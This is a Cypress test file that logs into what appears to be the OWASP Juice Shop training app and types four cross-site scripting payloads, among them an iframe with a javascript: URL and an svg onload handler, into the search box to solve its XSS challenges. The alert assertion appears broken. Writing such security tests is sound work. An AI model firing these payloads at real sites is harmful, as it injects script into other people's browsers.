import loginPage from "../PageObjects/loginPage";
const loginpage = new loginPage();

describe('Search', () => {
    beforeEach('Login', () => {
        cy.visit('/login');

        loginpage.setClickCancel();

        loginpage.setEmail("long17@yopmail.com");

        loginpage.setPassword("1234567");

        loginpage.clickSubmit();
      
    })

  describe('challenge "localXss"', () => {
    describe('Attack', () => {
      let data = [
        // challenge "localXss"
        ['<iframe src="javascript:alert(`xss`)">'],
        // challenge "xssBonusPayload"
        ['<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'], 
        ['</script><svg onload=alert(1)>'], 
        ['<x oncopy=alert(1)>copy this! ']

      ]
      data.forEach(row => {
        it('search query should be susceptible to reflected XSS attacks', function(){
          if (row.length > 0) {

            //print console
            console.log(row[0]);
      
            cy.get('#searchQuery').click()
            cy.get('#mat-input-0')
              .type(row[0])
              .type('{enter}')
      
            cy.wait(1000)
            // check xss
            cy.on('window:alert', () => {
              expect().to.equal('xss')
            })
            cy.clearAllCookies()
            cy.reload()
      
          }
        })
      });
    })
  })
})
